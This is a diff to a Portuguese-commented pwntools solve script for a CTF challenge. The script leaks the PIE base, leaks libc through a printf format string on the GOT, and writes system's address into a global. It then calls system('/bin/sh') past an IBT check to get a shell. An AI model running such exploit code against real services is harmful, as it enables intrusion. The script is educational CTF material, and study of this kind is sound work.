@@ -19,11 +19,11 @@
 #  Uso:
 #     python3 solve.py            # local  (contra ./chal)
 #     python3 solve.py REMOTE     # remoto (ajuste HOST/PORT abaixo)
+#     python3 solve.py GDB        # local sob gdb
 #
-#  OBS: o binario `chal` original NAO acompanha os slides. Os offsets marcados
-#  com [AJUSTAR] precisam ser confirmados contra o binario real (ver README).
-#  O script deriva o maximo possivel a partir dos simbolos do ELF; onde o ELF
-#  estiver stripado, preencha os valores constantes indicados.
+#  Os offsets abaixo (FMT_OFFSET etc.) estao confirmados contra o `chal`
+#  reconstruido deste repositorio. Contra o binario original do CTF, reconfirme
+#  os pontos indicados (ver README, secao "Offsets a confirmar").
 # =============================================================================
 
 from pwn import *
@@ -40,7 +40,18 @@ context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
 
 elf = ELF(BINARY, checksec=False)
-libc = ELF(LIBC_PATH, checksec=False) if os.path.exists(LIBC_PATH) else None
+
+# Escolha da libc:
+#   1) ./libc.so.6 se voce a trouxe do desafio;
+#   2) senao, para o exploit LOCAL, a libc do proprio sistema (o ./chal linka
+#      contra ela, entao os offsets de printf/system batem);
+#   3) senao (remoto sem libc), None -> use LibcSearcher com o leak de printf.
+if os.path.exists(LIBC_PATH):
+    libc = ELF(LIBC_PATH, checksec=False)
+elif not (args.REMOTE or "REMOTE" in sys.argv):
+    libc = ELF(os.path.realpath("/usr/lib/libc.so.6"), checksec=False)
+else:
+    libc = None
 
 
 def start():
@@ -58,7 +69,7 @@ def start():
 #      read(0, buf, 0xff);
 #      option = strtol(buf, &rest, 10);   // SEM validar o retorno (com sinal!)
 #      arg    = rest + 1;                 // "resto da linha" vira o RDI
-#      (*(code *)ptrs[(int)option - 1])(arg);
+#      ptrs[(int)option - 1](arg);        // UMA desreferencia: chama o slot
 #
 #  Entao mandamos "<option> <arg>" e o programa chama ptrs[option-1] com
 #  RDI = arg. Como option e com sinal e sem limite, ptrs[option-1] alcanca
@@ -66,10 +77,12 @@ def start():
 #  global `banter`, que fica a um offset fixo de ptrs.
 # ---------------------------------------------------------------------------
 
-#  Endereco da tabela ptrs[] e do global banter. Se os simbolos existirem no
-#  ELF, derivamos automaticamente; senao, preencha os offsets estaticos.
-PTRS_ADDR   = elf.symbols.get("ptrs")   or 0x0  # [AJUSTAR] se stripado
-BANTER_ADDR = elf.symbols.get("banter") or 0x0  # [AJUSTAR] se stripado
+#  Endereco da tabela ptrs[] e do global banter. Derivados dos simbolos do ELF
+#  (o binario nao esta stripado). Trabalhamos com os offsets ESTATICOS: como os
+#  indices sao relativos a ptrs, a base do PIE se cancela e nao precisamos
+#  relocar `elf`. A base so e usada para formar enderecos de runtime (leak).
+PTRS_ADDR   = elf.symbols["ptrs"]
+BANTER_ADDR = elf.symbols["banter"]
 
 
 def idx_for(addr):
@@ -91,72 +104,82 @@ def call_got(io, func, arg=b""):
     return call(io, idx_for(elf.got[func]), arg)
 
 
+# Cada iteracao do menu imprime exatamente a linha de opcoes. Consumir UMA linha
+# por acao mantem o tubo em sincronia.
+MENU_TAIL = b"hear taunt\n"
+
+
+def sync(io):
+    io.recvuntil(MENU_TAIL)
+
+
 # Atalhos para as "funcoes de brinquedo" do menu (indices 1..4 = ptrs[0..3]).
-def swing(io, arg=b""):       call(io, 1, arg)   # ptrs[0]: imprime um ponteiro
-def lob(io):                  call(io, 2)        # ptrs[1]: banter <<= 8
-def taunt(io, byte_val):      call(io, 3, str(byte_val).encode())  # ptrs[2]: banter |= atoi(arg)
-# def hear_taunt(io):         call(io, 4)        # ptrs[3]: execve -> BLOQUEADO pelo IBT
+def swing(io):
+    """ptrs[0]: imprime &banter (nosso vazamento de PIE). Retorna a linha."""
+    call(io, 1)
+    line = io.recvline()
+    sync(io)
+    return line
+
+
+def lob(io):
+    """ptrs[1]: banter <<= 8."""
+    call(io, 2)
+    sync(io)
+
+
+def taunt(io, byte_val):
+    """ptrs[2]: banter |= atoi(arg)."""
+    call(io, 3, str(byte_val).encode())
+    sync(io)
+
+
+# def hear_taunt(io):  call(io, 4)   # ptrs[3]: execve -> BLOQUEADO pelo IBT
 
 
 # ---------------------------------------------------------------------------
-#  Etapa 1 + 2 — Vazamento com printf + format string   (slide 11)
+#  Etapa 1 — Base do binario (PIE)   (slide 05/11)
+#
+#  swing (opcao 1) imprime o endereco de `banter`:
+#      "the ball sails over: 0x55...."
+#  Como banter tem offset estatico conhecido, a base do PIE sai de graca.
+# ---------------------------------------------------------------------------
+
+def leak_pie_base(io):
+    line = swing(io)                           # "the ball sails over: 0x...."
+    banter_rt = int(line.split(b"0x")[1].split()[0], 16)
+    base = banter_rt - BANTER_ADDR
+    log.success("base do binario = %#x", base)
+    return base
+
+
+# ---------------------------------------------------------------------------
+#  Etapa 2 — Vazamento da libc com printf + format string   (slide 11)
 #
 #  printf esta na GOT e recebe UM argumento (o formato). Chamamos printf pelo
-#  bug com RDI = nosso buffer -> format string controlado.
-#    - %p   : despeja valores da pilha/registradores -> acha a base do binario.
-#    - %N$s : le o conteudo de um endereco que colocamos no proprio buffer
-#             (o buffer esta na pilha, offset FMT_OFFSET) -> le a GOT -> libc.
+#  bug com RDI = nosso buffer -> format string controlado. Colocamos o endereco
+#  de GOT[func] num limite de 8 bytes do buffer e o lemos com %N$s -> o valor
+#  guardado na GOT = o endereco real da funcao na libc.
+#
+#  Layout do buffer na pilha (confirmado neste binario): o buf comeca a aparecer
+#  em %8$  (FMT_OFFSET). Entao a qword no offset 16 do buf e %10$.
 # ---------------------------------------------------------------------------
 
-FMT_OFFSET = 6   # [AJUSTAR] posicao na pilha onde comeca o nosso buffer.
-                 # Descubra mandando "%p|%p|%p|..." e localizando o marcador.
+FMT_OFFSET = 8    # posicao (%N$) onde a 1a qword do nosso buffer aparece
+ADDR_OFF   = 16   # offset (em bytes) dentro do buf onde cravamos o endereco
 
 
-def find_fmt_offset(io):
-    """Helper opcional: localiza em que %N$ o nosso buffer aparece."""
-    marker = b"ABCD"
-    for n in range(1, 40):
-        p = start() if io is None else io
-        call_got(p, "printf", marker + b"|%" + str(n).encode() + b"$p")
-        line = p.recvline()
-        if b"0x44434241" in line:  # "ABCD" little-endian
-            log.success("FMT_OFFSET = %d", n)
-            return n
-    return None
-
-
-def leak_binary_base(io):
-    """Vaza a base do binario (PIE) via %p. Slide 11, passo 1 ('meio as cegas')."""
-    # Pedimos varios %p e procuramos um ponteiro 0x55.../0x56... (codigo PIE).
-    call_got(io, "printf", b"|".join(b"%p" for _ in range(20)))
-    leaks = io.recvline().strip().split(b"|")
-    for raw in leaks:
-        try:
-            val = int(raw, 16)
-        except ValueError:
-            continue
-        # Um ponteiro de codigo do binario tem a faixa alta 0x55/0x56.
-        if (val >> 40) in (0x55, 0x56):
-            # [AJUSTAR] subtraia o offset estatico do simbolo vazado p/ achar a base.
-            KNOWN_OFFSET = 0x0  # ex.: offset de um retorno conhecido em .text
-            base = val - KNOWN_OFFSET
-            base &= ~0xfff      # alinha a pagina
-            log.success("base do binario = %#x", base)
-            return base
-    log.failure("nao achei ponteiro PIE nos %p; ajuste a varredura")
-    return None
-
-
-def leak_libc_addr(io, bin_base, func):
-    """Le GOT[func] com %s -> endereco real da funcao na libc. Slide 11, passo 2."""
-    got_addr = bin_base + (elf.got[func] - elf.address)
-    # Alinha para que o endereco caia num slot de 8 bytes da pilha, e usa %N$s.
-    payload = b"%" + str(FMT_OFFSET + 1).encode() + b"$s||"
-    payload = payload.ljust(8, b"A")       # alinhamento a 8 bytes
-    payload += p64(got_addr)               # endereco lido pelo %s
-    call_got(io, "printf", payload)
-    data = io.recvuntil(b"||").split(b"||")[0]
-    addr = u64(data[:6].ljust(8, b"\x00"))
+def leak_libc_addr(io, base, func):
+    """Le GOT[func] com %s -> endereco real da funcao na libc. Slide 11."""
+    got_rt = base + elf.got[func]                     # endereco de runtime da GOT
+    which  = FMT_OFFSET + ADDR_OFF // 8               # qword do endereco -> %10$
+    prefix = str(idx_for(elf.got["printf"])).encode() + b" "
+    payload = (prefix + b"%" + str(which).encode() + b"$s").ljust(ADDR_OFF, b"A")
+    payload += p64(got_rt)                            # endereco lido pelo %s
+    io.sendline(payload)
+    leak = io.recvuntil(b"1) serve", drop=True)       # saida do printf
+    sync(io)                                          # consome o resto do menu
+    addr = u64(leak[:6].ljust(8, b"\x00"))
     log.success("libc %s = %#x", func, addr)
     return addr
 
@@ -173,10 +196,9 @@ def leak_libc_addr(io, bin_base, func):
 def write_banter(io, value):
     """Escreve `value` (6 bytes) no global banter usando taunt(OR)+lob(shift)."""
     for i in range(5, -1, -1):               # byte 5 (mais alto) -> byte 0
-        x = (value >> (i * 8)) & 0xff
-        taunt(io, x)                         # banter |= x
+        taunt(io, (value >> (i * 8)) & 0xff)  # banter |= x
         if i != 0:
-            lob(io)                          # banter <<= 8
+            lob(io)                           # banter <<= 8
 
 
 # ---------------------------------------------------------------------------
@@ -185,21 +207,19 @@ def write_banter(io, value):
 
 def exploit():
     io = start()
+    sync(io)                                   # menu inicial
 
     # --- Passo 1: base do binario (resolve PIE) ---
-    bin_base = leak_binary_base(io)
-    elf.address = bin_base                    # reloca os simbolos do ELF
+    base = leak_pie_base(io)
 
     # --- Passo 2: ler a GOT -> identificar a libc -> endereco de system ---
-    leak_printf = leak_libc_addr(io, bin_base, "printf")
+    leak_printf = leak_libc_addr(io, base, "printf")
 
-    global libc
     if libc is None:
-        # Sem libc local: use os vazamentos (printf/read/puts) no libc.rip /
-        # LibcSearcher para identificar a versao e descomente o bloco abaixo.
+        # Sem libc: use o leak de printf no libc.rip / LibcSearcher p/ resolver.
         #   from LibcSearcher import LibcSearcher
         #   s = LibcSearcher("printf", leak_printf)
-        #   libc_base = leak_printf - s.dump("printf")
+        #   libc_base   = leak_printf - s.dump("printf")
         #   system_addr = libc_base + s.dump("system")
         log.error("Forneca LIBC_PATH ou use LibcSearcher com o leak de printf "
                   "(%#x) para resolver system." % leak_printf)
@@ -216,8 +236,7 @@ def exploit():
     # --- Passo 4: chamar o indice do banter com RDI = "/bin/sh" ---
     #   ptrs[banter_index-1] == banter == &system  ->  system("/bin/sh")
     #   O system comeca com ENDBR64 na libc, entao o IBT APROVA. ("popping a shell")
-    banter_index = idx_for(BANTER_ADDR)
-    call(io, banter_index, b"/bin/sh\x00")
+    call(io, idx_for(BANTER_ADDR), b"/bin/sh")
 
     log.success("popping a shell")
     io.interactive()                          # wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly}
